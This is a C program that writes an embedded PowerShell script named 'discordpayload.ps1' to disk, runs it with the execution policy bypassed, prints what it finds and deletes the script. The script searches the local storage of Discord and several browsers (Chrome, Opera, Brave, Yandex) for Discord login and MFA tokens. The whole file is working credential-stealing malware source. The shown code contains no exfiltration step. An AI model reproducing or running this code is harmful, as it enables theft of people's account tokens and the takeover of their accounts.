#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char payload[] = "function Find-Tokens{param([string]$p)$t=@();$p+='\\Local Storage\\leveldb';Get-ChildItem $p|ForEach-Object{$f=$_.Name;if($f -notmatch '\\.log$|\\.ldb$'){return}$t+=Select-String -Path \"$p\\$f\" -Pattern '([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84})' -AllMatches|ForEach-Object{$_.Matches.Value}};return $t}$l=[System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData);$r=[System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData);$p=@{'Discord'=\"$r\\Discord\";'Discord Canary'=\"$r\\discordcanary\";'Discord PTB'=\"$r\\discordptb\";'Google Chrome'=\"$l\\Google\\Chrome\\User Data\\Default\";'Opera'=\"$r\\Opera Software\\Opera Stable\";'Brave'=\"$l\\BraveSoftware\\Brave-Browser\\User Data\\Default\";'Yandex'=\"$l\\Yandex\\YandexBrowser\\User Data\\Default\"};$m=\"\";foreach($pl in $p.Keys){$pa=$p[$pl];if(-not(Test-Path $pa)){continue};$m+=\"`n**$pl**`n\";$t=Find-Tokens -p $pa;if($t.Count -gt 0){$m+=$t -join \"`n\"}else{$m+=\"No tokens found.\"}}$m";

    char file[] = "discordpayload.ps1";

    FILE* tempScript = fopen(file, "w");
    if (tempScript == NULL) {
        perror("Error creating the payload file.");
        return 1;
    }
    fprintf(tempScript, "%s", payload);
    fclose(tempScript);

    char command[200];
    sprintf(command, "powershell.exe -ExecutionPolicy Bypass -File %s", file);

    char buffer[4096];
    char* output = NULL;
    FILE* pipe = popen(command, "r");
    if (pipe == NULL) {
        perror("Error executing PowerShell command");
    } else {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            if (output == NULL) {
                output = strdup(buffer);
            } else {
                char* new_output = malloc(strlen(output) + strlen(buffer) + 1);
                if (new_output == NULL) {
                    perror("Memory allocation error");
                    break;
                }
                strcpy(new_output, output);
                strcat(new_output, buffer);
                free(output);
                output = new_output;
            }
        }
        pclose(pipe);
    }

    printf("%s\n", output);

    remove(file);
    free(output);

    return 0;
}
